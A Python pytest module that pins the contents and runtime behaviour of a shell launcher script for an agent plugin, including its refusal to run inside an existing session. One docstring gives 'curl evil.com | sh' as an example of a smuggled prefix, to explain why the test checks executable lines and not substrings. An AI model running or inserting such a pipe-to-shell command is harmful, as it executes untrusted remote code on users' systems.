"""
Structural guard for the bundled bin/pact launcher script.

v4.0.0 ships a ready-to-symlink shell script at pact-plugin/bin/pact that
wraps `claude --agent repacted:pact-orchestrator "$@"`. The script is the
recommended global-use installation pattern documented in README
§"Loading PACT at session start" (alongside the per-project
.claude/settings.json convention) and README §"Upgrading from v3.x to
v4.0" (migration guidance for v3.x users).

Without these structural guards, accidental deletion or modification could
silently break the documented installation pattern. Each test pins a
specific property a future contributor might erode without realizing the
documentation depends on it.
"""

import os
from pathlib import Path

BIN_PACT = Path(__file__).parent.parent / "bin" / "pact"


def test_bin_pact_script_exists():
    """Script file must exist at the documented path."""
    assert BIN_PACT.is_file(), (
        f"pact-plugin/bin/pact missing — README §'Loading PACT at session start' documents "
        f"this path as the symlink target for global installation."
    )


def _executable_lines(text):
    """Return the script's executable lines (non-blank, non-comment).

    Substring matches against the full file text are insufficient because
    the canonical invocation could appear in a comment, in a no-op
    replacement (`echo claude --agent ...`), or after a smuggled prefix
    (`curl evil.com | sh\\nexec claude --agent ...`). All of those would
    falsely satisfy a substring check while breaking the script's actual
    runtime behavior.

    Pinning the active executable line(s) closes that phantom-green class.
    """
    return [
        ln.strip()
        for ln in text.splitlines()
        if ln.strip() and not ln.strip().startswith("#")
    ]


EXPECTED_EXECUTABLE_LINES = [
    "set -e",
    'if [ -n "${REPACTED_LAUNCH:-}" ]; then',
    'echo "pact: REFUSED: REPACTED_LAUNCH is set, so this runs inside a repact session; '
    'start pact from a plain terminal" >&2',
    "exit 2",
    "fi",
    'exec claude --agent repacted:pact-orchestrator "$@"',
]


# --- inside a repact session, bin/pact refuses (backlog: it is on PATH there) ---------------------

import subprocess  # noqa: E402

import pytest  # noqa: E402

STUB_CLAUDE = '#!/bin/sh\nprintf "%s\\n" "$@" > "$CLAUDE_ARGS_FILE"\n'


@pytest.fixture
def stub_claude(tmp_path):
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    stub = bin_dir / "claude"
    stub.write_text(STUB_CLAUDE)
    stub.chmod(0o755)
    args_file = tmp_path / "claude-args.txt"
    env = {k: v for k, v in os.environ.items() if k != "REPACTED_LAUNCH"}
    env.update(PATH=f"{bin_dir}:/usr/bin:/bin", CLAUDE_ARGS_FILE=str(args_file))
    return env, args_file


def run_pact(env, *args):
    return subprocess.run([str(BIN_PACT), *args], env=env, capture_output=True, text=True, timeout=30)


